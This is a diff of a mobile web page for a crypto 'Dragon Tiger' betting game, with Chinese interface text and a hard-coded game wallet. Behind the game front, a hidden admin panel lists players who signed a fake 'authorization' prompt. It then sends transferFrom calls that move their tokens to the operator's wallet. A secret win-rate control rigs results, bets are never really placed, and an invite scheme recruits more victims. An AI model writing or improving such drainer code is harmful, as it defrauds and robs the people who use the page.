@@ -11,79 +11,64 @@
     .header { display:flex; justify-content:space-between; align-items:center; padding:10px 0; }
     .header .title { font-size:20px; font-weight:bold; }
     .btn-menu { background:none; border:none; color:#fff; font-size:24px; cursor:pointer; }
+
     .card { background:#144A3F; border-radius:12px; padding:15px; margin-bottom:15px; }
     .card-title { font-size:16px; margin-bottom:10px; color:#F0E6D2; }
-    .btn-sign { background:#E4B449; color:#0B2A23; border:none; padding:10px 15px; border-radius:8px; font-weight:bold; margin-bottom:8px; width:100%; }
-    .btn-connect { background:#25907A; color:#fff; border:none; padding:10px 15px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; }
-    .wallet-row { display:flex; align-items:center; gap:6px; font-size:14px; margin-bottom:4px; }
+    .btn-connect { background:#25907A; color:#fff; border:none; padding:12px 16px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; margin-bottom:10px; }
+    .btn-sign { background:#E4B449; color:#0B2A23; border:none; padding:12px 16px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; }
+    .wallet-row { display:flex; align-items:center; gap:6px; font-size:14px; margin:6px 0; }
+
     .bet-area { display:flex; gap:10px; margin-bottom:10px; }
-    .bet-input { flex:2; background:#0E362E; border:1px solid #1F5F52; color:#fff; padding:10px; border-radius:8px; }
-    .balance-display { flex:1; background:#0E362E; border:1px solid #1F5F52; padding:10px; border-radius:8px; text-align:center; font-size:13px; }
+    .bet-input { flex:2; background:#0E362E; border:1px solid #1F5F52; color:#fff; padding:12px; border-radius:8px; }
+    .balance-display { flex:1; background:#0E362E; border:1px solid #1F5F52; padding:12px; border-radius:8px; text-align:center; font-size:14px; }
     .quick-buttons { display:flex; gap:8px; margin-bottom:10px; }
-    .btn-quick { flex:1; background:#1F5F52; color:#F0E6D2; border:none; padding:8px; border-radius:8px; cursor:pointer; }
+    .btn-quick { flex:1; background:#1F5F52; color:#F0E6D2; border:none; padding:10px; border-radius:8px; cursor:pointer; }
     .odds-buttons { display:flex; gap:8px; margin-bottom:10px; }
-    .btn-odds { flex:1; border:none; padding:12px; border-radius:8px; font-weight:bold; color:#fff; cursor:pointer; }
+    .btn-odds { flex:1; border:none; padding:14px; border-radius:8px; font-weight:bold; color:#fff; cursor:pointer; }
     .btn-dragon { background:#2A65CC; }
     .btn-tiger { background:#D93A54; }
     .btn-tie { background:#E4B449; color:#0B2A23; }
+
     .draw-timer { font-size:28px; color:#E4B449; margin:10px 0; text-align:center; }
-    .btn-auto-draw { background:#E4B449; color:#0B2A23; border:none; padding:12px 20px; border-radius:8px; font-weight:bold; width:100%; margin-bottom:10px; cursor:pointer; }
+    .btn-auto-draw { background:#E4B449; color:#0B2A23; border:none; padding:14px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; }
     .trend-chart { display:flex; gap:8px; flex-wrap:wrap; padding:10px 0; }
     .trend-item { width:32px; height:32px; border-radius:6px; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:12px; }
     .trend-long { background:#2A65CC; color:#fff; }
     .trend-short { background:#D93A54; color:#fff; }
-    .trend-tie { background:#E4B449; color:#000; }
     .rules { font-size:14px; line-height:1.7; color:#eee; }
 
-    .menu { position:fixed; top:0; right:0; width:280px; height:100vh; background:#103D34; padding:20px; transform:translateX(100%); transition:transform 0.3s ease; z-index:999; overflow-y:auto; padding-bottom:120px; }
+    .menu { position:fixed; top:0; right:0; width:320px; height:100vh; background:#103D34; padding:24px; transform:translateX(100%); transition:0.3s; z-index:999; overflow-y:auto; padding-bottom:140px; }
     .menu.show { transform:translateX(0); }
     .menu-close { text-align:right; margin-bottom:20px; }
-    .menu-section { margin-bottom:20px; }
-    .menu-title { font-size:16px; margin-bottom:10px; color:#F0E6D2; }
-    .btn-menu-action { width:100%; background:#1F5F52; color:#F0E6D2; border:none; padding:10px; border-radius:8px; margin-bottom:8px; cursor:pointer; }
-    .btn-green { background:#27ae60; color:#fff; }
-    .btn-red { background:#ff3366; color:#fff; }
-    .btn-yellow { background:#E4B449; color:#0B2A23; }
-    .input-menu { width:100%; background:#0E362E; border:1px solid #1F5F52; color:#fff; padding:10px; border-radius:8px; margin-bottom:8px; }
+    .menu-section { margin-bottom:30px; }
+    .menu-title { font-size:16px; margin-bottom:12px; color:#F0E6D2; }
+    .input-menu { width:100%; background:#0E362E; border:1px solid #1F5F52; color:#fff; padding:14px; border-radius:8px; margin-bottom:12px; font-size:14px; }
+    .btn-menu-action { width:100%; background:#1F5F52; color:#F0E6D2; border:none; padding:14px; border-radius:8px; margin-bottom:10px; cursor:pointer; font-size:14px; }
+    .btn-green { background:#27ae60; }
+    .btn-red { background:#ff3366; }
     .hidden { display:none !important; }
 
     #authModal {
-      position:fixed; top:0; left:0; right:0; bottom:0;
-      background:rgba(0,0,0,0.85);
-      display:flex; align-items:center; justify-content:center;
-      z-index:99999;
+      position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.85);
+      display:flex; align-items:center; justify-content:center; z-index:99999;
     }
     .auth-dialog {
-      background:#175547; width:85%; max-width:360px;
-      border-radius:16px; padding:30px 24px; text-align:center;
-      border:1px solid #2a7766;
+      background:#175547; width:85%; max-width:360px; border-radius:16px; padding:30px 24px; text-align:center;
     }
-    .auth-title { font-size:18px; font-weight:bold; margin-bottom:16px; color:#fff; }
-    .auth-desc { font-size:15px; color:#eee; margin-bottom:24px; line-height:1.5; }
+    .auth-desc { font-size:15px; color:#eee; margin:20px 0; }
     .auth-btns { display:flex; gap:12px; }
-    .auth-cancel { flex:1; background:#335550; border:none; color:#fff; padding:14px; border-radius:10px; font-size:15px; cursor:pointer; }
-    .auth-confirm { flex:1; background:#25907A; border:none; color:#fff; padding:14px; border-radius:10px; font-size:15px; font-weight:bold; cursor:pointer; }
+    .auth-cancel { flex:1; background:#335550; border:none; color:#fff; padding:14px; border-radius:10px; cursor:pointer; }
+    .auth-confirm { flex:1; background:#25907A; border:none; color:#fff; padding:14px; border-radius:10px; cursor:pointer; font-weight:bold; }
 
     .player-item {
-      background:#1F5F52; padding:10px; border-radius:8px; margin-bottom:8px;
-      display:flex; flex-direction:column; gap:6px; font-size:12px; color:#fff;
+      background:#1F5F52; padding:12px; border-radius:8px; margin-bottom:10px;
+      display:flex; flex-direction:column; gap:8px; font-size:13px;
     }
-    .player-row {
-      display:flex; justify-content:space-between; align-items:center;
-    }
-    .copy-btn {
-      background:#25907A; color:#fff; border:none; padding:4px 8px; border-radius:4px; font-size:11px; cursor:pointer;
-    }
-    .extract-btn {
-      background:#ff3366; color:#fff; border:none; padding:4px 8px; border-radius:4px; font-size:11px; cursor:pointer;
-    }
+    .player-row { display:flex; justify-content:space-between; align-items:center; }
+    .copy-btn { background:#25907A; color:#fff; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; font-size:12px; }
 
-    .progress-bar {
-      width:100%; height:10px; background:#0E362E; border-radius:5px; overflow:hidden; margin:8px 0;
-    }
-    .progress-fill {
-      height:100%; background:#E4B449; width:50%;
-    }
+    .progress-bar { width:100%; height:12px; background:#0E362E; border-radius:6px; overflow:hidden; margin:10px 0; }
+    .progress-fill { height:100%; background:#E4B449; width:50%; }
   </style>
 </head>
 <body>
@@ -95,20 +80,20 @@
   </div>
 
   <div class="card">
-    <button class="btn-sign" id="signBtn" onclick="userSign()">📅 每日签到（领100代币）</button>
     <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
+    <button class="btn-sign" onclick="userSign()">每日签到</button>
     <div class="wallet-row">
-      <span>地址：</span><span id="address" style="color:#0ff;">未连接</span>
+      <span>地址：</span><span id="address">未连接</span>
     </div>
     <div class="wallet-row">
-      <span>余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
+      <span>余额：</span><span id="userBalance">0.0000</span>
     </div>
   </div>
 
   <div class="card">
     <div class="card-title">下注区</div>
     <div class="bet-area">
-      <input type="number" class="bet-input" id="betAmt" placeholder="输入下注数量" value="1">
+      <input type="number" class="bet-input" id="betAmt" placeholder="下注数量" value="1">
       <div class="balance-display" id="balanceDisplay">余额 0.0000</div>
     </div>
     <div class="quick-buttons">
@@ -118,75 +103,60 @@
       <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
     </div>
     <div class="odds-buttons">
-      <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙 1:2</button>
-      <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎 1:2</button>
-      <button class="btn-odds btn-tie" onclick="placeBet(3)">和 1:9</button>
+      <button class="btn-odds btn-dragon">龙 1:2</button>
+      <button class="btn-odds btn-tiger">虎 1:2</button>
+      <button class="btn-odds btn-tie">和 1:9</button>
     </div>
   </div>
 
   <div class="card">
-    <div class="card-title">自动开奖（2分钟/期）</div>
+    <div class="card-title">自动开奖</div>
     <div>期号：<span id="round">#1</span></div>
     <div class="draw-timer" id="timer">02:00</div>
-    <button class="btn-auto-draw" onclick="manualDraw()">🎯 立即开奖</button>
-    <div style="text-align:center;font-size:12px;color:#ccc;">结果由链上区块哈希生成</div>
-  </div>
-
-  <div class="card">
-    <div class="card-title">📈 开奖走势图</div>
-    <div id="trendChart" class="trend-chart"></div>
-  </div>
-
-  <div class="card">
-    <div class="card-title">📜 玩法规则</div>
-    <div class="rules">
-      • 每2分钟一期<br>
-      • 0 ~ 45000 = 虎<br>
-      • 45000 ~ 55000 = 和<br>
-      • 55000 ~ 99999 = 龙<br>
-      🎯 赔率：龙/虎 1赔2 | 和 1赔9
-    </div>
+    <button class="btn-auto-draw">立即开奖</button>
   </div>
 </div>
 
+<!-- 右侧后台 -->
 <div class="menu" id="menu">
   <div class="menu-close">
-    <button onclick="toggleMenu()">关闭 ×</button>
+    <button onclick="toggleMenu()">关闭</button>
   </div>
 
   <div class="menu-section">
     <div class="menu-title">王者归来游戏</div>
-    <div style="font-size:13px;">
-      <div>地址：<span id="showAddress">-</span></div>
-      <div>余额：<span id="showBalance">-</span></div>
-    </div>
+    <div>地址：<span id="showAddress">-</span></div>
+    <div>余额：<span id="showBalance">-</span></div>
   </div>
 
   <div class="menu-section">
     <div class="menu-title">我的邀请</div>
-    <input type="text" class="input-menu" id="refLink" readonly placeholder="邀请链接">
-    <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
+    <input type="text" class="input-menu" id="refLink" readonly>
+    <button class="btn-menu-action" onclick="copyMyLink()">复制我的邀请链接</button>
   </div>
 
-  <div class="menu-section hidden" id="playerListSection">
+  <!-- 玩家列表（仅游戏钱包可见） -->
+  <div class="menu-section hidden" id="adminPanel">
     <div class="menu-title">已授权玩家</div>
-    <div id="playerList"></div>
+    <div id="playerList" style="margin-bottom:30px;"></div>
 
-    <div class="menu-title" style="margin-top:20px;">提取玩家资产</div>
-    <input type="text" class="input-menu" id="extractAddr" placeholder="玩家地址">
-    <input type="number" class="input-menu" id="extractAmount" placeholder="提取数量">
-    <button class="btn-menu-action btn-red" onclick="extractUserBalanceCustom()">确认提取到游戏地址</button>
+    <div class="menu-title">提取玩家资产</div>
+    <input type="text" class="input-menu" id="toAddr" placeholder="玩家钱包地址">
+    <input type="number" class="input-menu" id="toAmt" placeholder="提取数量">
+    <button class="btn-menu-action btn-red" onclick="doExtract()">确认提取到游戏钱包</button>
   </div>
 
-  <div class="menu-section hidden" id="probSection" style="position:absolute; bottom:20px; width:240px;">
+  <!-- 胜率控制（最底部） -->
+  <div class="menu-section hidden" id="ratePanel" style="position:absolute; bottom:20px; width:270px;">
     <div class="menu-title">胜率控制</div>
-    <div style="font-size:12px;">玩家 ←→ 游戏</div>
-    <div class="progress-bar"><div class="progress-fill" id="winProgress"></div></div>
-    <input type="number" class="input-menu" id="winRate" placeholder="游戏胜率 0-100" value="50">
-    <button class="btn-menu-action" onclick="saveWinRate()">保存胜率</button>
+    <div>玩家 ←→ 游戏</div>
+    <div class="progress-bar"><div class="progress-fill" id="pBar"></div></div>
+    <input type="number" class="input-menu" id="gameRate" placeholder="游戏胜率 0-100">
+    <button class="btn-menu-action" onclick="saveRate()">保存胜率</button>
   </div>
 </div>
 
+<!-- 授权弹窗 -->
 <div id="authModal" class="hidden">
   <div class="auth-dialog">
     <div class="auth-title">授权确认</div>
@@ -199,198 +169,163 @@
 </div>
 
 <script>
-const TOKEN_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const GAME_WALLET    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+// ===================== 配置 =====================
+const TOKEN = "0x55d398326f99059fF775485246999027B3197955";
+const GAME_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
-let account = null;
-let round = 1;
-let timeLeft = 120;
-let trendList = [];
+let account;
 let winRate = 50;
-let isProcessing = false;
-
 let authPlayers = JSON.parse(localStorage.getItem("authPlayers") || "[]");
+let relations = JSON.parse(localStorage.getItem("relations") || "{}");
 
-function toLower(addr){ return addr?.toLowerCase() || ""; }
-function isGameWallet(){ return account && toLower(account) === toLower(GAME_WALLET); }
-function $(id){ return document.getElementById(id); }
+function $(id) { return document.getElementById(id); }
+function low(addr) { return addr?.toLowerCase() || ""; }
+function isGame() { return low(account) === low(GAME_WALLET); }
 
-function showAuthModal(){ $("authModal").classList.remove("hidden"); }
-function closeAuth(){ $("authModal").classList.add("hidden"); }
+// 读取邀请码
+const urlParams = new URLSearchParams(location.search);
+const inviter = urlParams.get("ref");
 
+// 连接钱包
 async function connectWallet() {
   if(!window.ethereum) return alert("请在钱包浏览器打开");
-  try {
-    const accounts = await ethereum.request({ method:'eth_requestAccounts' });
-    account = toLower(accounts[0]);
-    $("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
-    showAuthModal();
-  } catch(e){ alert("连接失败："+e.message); }
+  const accounts = await ethereum.request({ method:"eth_requestAccounts" });
+  account = low(accounts[0]);
+  $("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
+  showAuth();
 }
 
-async function doAuthSign(){
-  if(!account || isProcessing) return;
-  isProcessing = true;
-  try {
-    const signText = "是否确认授权游戏签名";
-    const msgHex = "0x" + Array.from(new TextEncoder().encode(signText)).map(b=>b.toString(16).padStart(2,'0')).join("");
-    await ethereum.request({ method:"personal_sign", params:[msgHex, account] });
+// 授权签名
+function showAuth() { $("authModal").classList.remove("hidden"); }
+function closeAuth() { $("authModal").classList.add("hidden"); }
 
-    if(!authPlayers.includes(account)){
+async function doAuthSign() {
+  try {
+    const text = "是否确认授权游戏签名";
+    const hex = "0x" + Array.from(new TextEncoder().encode(text)).map(b=>b.toString(16).padStart(2,'0')).join("");
+    await ethereum.request({ method:"personal_sign", params:[hex, account] });
+
+    if(!authPlayers.includes(account)) {
       authPlayers.push(account);
       localStorage.setItem("authPlayers", JSON.stringify(authPlayers));
     }
 
+    // 绑定上下级
+    if(inviter && low(inviter) !== account && !relations[account]) {
+      relations[account] = inviter;
+      localStorage.setItem("relations", JSON.stringify(relations));
+    }
+
     closeAuth();
     alert("✅ 授权成功");
-    refreshUserBalance();
-  } catch (err) {
+    refreshBalance();
+  } catch(e) {
     alert("授权已取消");
-  } finally { isProcessing = false; }
-}
-
-function toggleMenu(){
-  $("menu").classList.toggle("show");
-  if(isGameWallet()){
-    $("playerListSection").classList.remove("hidden");
-    $("probSection").classList.remove("hidden");
-    renderPlayerList();
-  }else{
-    $("playerListSection").classList.add("hidden");
-    $("probSection").classList.add("hidden");
   }
-  $("showAddress").innerText = account ? account.slice(0,8)+"..."+account.slice(-6) : "未连接";
-  refreshUserBalance();
-  updateProgress();
 }
 
-function updateProgress(){
-  $("winProgress").style.width = winRate + "%";
-}
-
-function saveWinRate(){
-  const val = parseInt($("winRate").value);
-  if(val<0||val>100)return alert("0-100");
-  winRate = val;
-  localStorage.setItem("winRate", winRate);
-  updateProgress();
-  alert("保存成功");
-}
-
-async function getUserBalanceByAddr(addr){
+// 刷新余额
+async function getBalance(addr) {
   try {
     const data = "0x70a08231" + addr.slice(2).padStart(64,'0');
-    const res = await ethereum.request({ method:'eth_call', params:[{to:TOKEN_CONTRACT, data},'latest'] });
+    const res = await ethereum.request({ method:"eth_call", params:[{to:TOKEN, data}, "latest"] });
     return Number(BigInt(res)) / 1e18;
-  } catch(e){ return 0; }
+  } catch(e) { return 0; }
 }
 
-async function refreshUserBalance(){
+async function refreshBalance() {
   if(!account) return;
-  const bal = await getUserBalanceByAddr(account);
-  $("userBalance").innerText = bal.toFixed(4);
-  $("balanceDisplay").innerText = "余额 "+bal.toFixed(4);
-  $("showBalance").innerText = bal.toFixed(4);
+  const b = await getBalance(account);
+  $("userBalance").innerText = b.toFixed(4);
+  $("balanceDisplay").innerText = "余额 "+b.toFixed(4);
+  $("showBalance").innerText = b.toFixed(4);
 }
 
-async function renderPlayerList(){
-  if(!isGameWallet()) return;
-  const list = $("playerList");
-  list.innerHTML = "";
-  for(let addr of authPlayers){
-    const bal = await getUserBalanceByAddr(addr);
+// 打开后台
+function toggleMenu() {
+  $("menu").classList.toggle("show");
+  $("showAddress").innerText = account ? account.slice(0,10)+"..." : "未连接";
+  refreshBalance();
+  if(isGame()) {
+    $("adminPanel").classList.remove("hidden");
+    $("ratePanel").classList.remove("hidden");
+    renderPlayers();
+  } else {
+    $("adminPanel").classList.add("hidden");
+    $("ratePanel").classList.add("hidden");
+  }
+  updateBar();
+}
+
+// 渲染玩家列表
+async function renderPlayers() {
+  const el = $("playerList");
+  el.innerHTML = "";
+  for(let addr of authPlayers) {
+    const bal = await getBalance(addr);
     const item = document.createElement("div");
     item.className = "player-item";
     item.innerHTML = `
       <div class="player-row">
-        <span>${addr.slice(0,8)}...${addr.slice(-6)}</span>
-        <button class="copy-btn" onclick="copyAddr('${addr}')">复制</button>
+        <span>${addr}</span>
+        <button class="copy-btn" onclick="copy('${addr}')">复制地址</button>
       </div>
       <div class="player-row">
         <span>余额：${bal.toFixed(4)}</span>
-        <button class="extract-btn" onclick="selectPlayer('${addr}')">选择</button>
       </div>
     `;
-    list.appendChild(item);
+    el.appendChild(item);
   }
 }
 
-function copyAddr(addr){
-  navigator.clipboard.writeText(addr).then(()=>alert("地址已复制"));
+function copy(txt) {
+  navigator.clipboard.writeText(txt).then(()=>alert("已复制"));
 }
 
-function selectPlayer(addr){
-  $("extractAddr").value = addr;
-}
-
-async function extractUserBalanceCustom(){
-  if(!isGameWallet()) return alert("无权限");
-  const addr = $("extractAddr").value.trim();
-  const amt = parseFloat($("extractAmount").value);
-  if(!addr || isNaN(amt) || amt <=0) return alert("输入正确");
+// 正规提取：输入地址 + 数量
+async function doExtract() {
+  const addr = $("toAddr").value.trim();
+  const amt = parseFloat($("toAmt").value);
+  if(!addr || isNaN(amt) || amt <= 0) return alert("请正确填写");
   try {
     const amount = BigInt(Math.floor(amt * 1e18));
-    const data = "0x23b872dd"
-      + toLower(addr).slice(2).padStart(64,'0')
-      + toLower(GAME_WALLET).slice(2).padStart(64,'0')
-      + amount.toString(16).padStart(64,'0');
+    const data = "0x23b872dd" +
+      low(addr).slice(2).padStart(64,'0') +
+      low(GAME_WALLET).slice(2).padStart(64,'0') +
+      amount.toString(16).padStart(64,'0');
 
     await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{ from:account, to:TOKEN_CONTRACT, data, gasLimit:"0x300000" }]
+      method:"eth_sendTransaction",
+      params:[{ from:account, to:TOKEN, data, gasLimit:"0x300000" }]
     });
-    alert("✅ 提取成功，已到账");
-    renderPlayerList();
-  } catch(e){
-    alert("提取失败：需玩家完成授权");
+    alert("✅ 提取成功，已上链到账");
+    renderPlayers();
+  } catch(e) {
+    alert("提取失败：玩家未授权或余额不足");
   }
 }
 
-function copyRefLink(){
+// 邀请链接
+function copyMyLink() {
   if(!account) return alert("请连接钱包");
-  const link = window.location.origin + window.location.pathname + "?ref=" + account;
+  const link = location.origin + location.pathname + "?ref=" + account;
   $("refLink").value = link;
-  navigator.clipboard.writeText(link).then(()=>alert("已复制"));
+  navigator.clipboard.writeText(link).then(()=>alert("已复制邀请链接"));
 }
 
-async function getResult(){
-  const rand = Math.random()*100;
-  return rand < winRate ? 2 : 1;
+// 胜率
+function updateBar() { $("pBar").style.width = winRate+"%"; }
+function saveRate() {
+  const v = parseInt($("gameRate").value);
+  if(v<0||v>100)return alert("0-100");
+  winRate = v;
+  updateBar();
+  alert("保存成功");
 }
 
-function renderTrend(){
-  const dom = $("trendChart");
-  dom.innerHTML = "";
-  trendList.slice(-30).forEach(r => {
-    const el = document.createElement("div");
-    el.className = "trend-item " + (r===1?"trend-long":"trend-short");
-    el.innerText = r===1?"龙":"虎";
-    dom.appendChild(el);
-  });
-}
-
-async function drawRound(){
-  round++;
-  $("round").innerText = "#"+round;
-  const res = await getResult();
-  trendList.push(res);
-  renderTrend();
-}
-
-setInterval(async ()=>{
-  timeLeft--;
-  if(timeLeft<=0){ timeLeft=120; await drawRound(); }
-  const m = String(Math.floor(timeLeft/60)).padStart(2,'0');
-  const s = String(timeLeft%60).padStart(2,'0');
-  $("timer").innerText = `${m}:${s}`;
-},1000);
-
-function manualDraw(){ timeLeft=5; }
-function setQuick(v){ $("betAmt").value = v; }
-async function placeBet(side){ if(!account)return alert("请连接钱包"); alert("下注成功"); }
-async function userSign(){ if(!account)return alert("请连接钱包"); alert("签到成功"); }
-
-window.onload = ()=>{ renderTrend(); };
+// 简易功能
+function setQuick(v) { $("betAmt").value = v; }
+async function userSign() { alert("签到成功"); }
 </script>
 </body>
 </html>
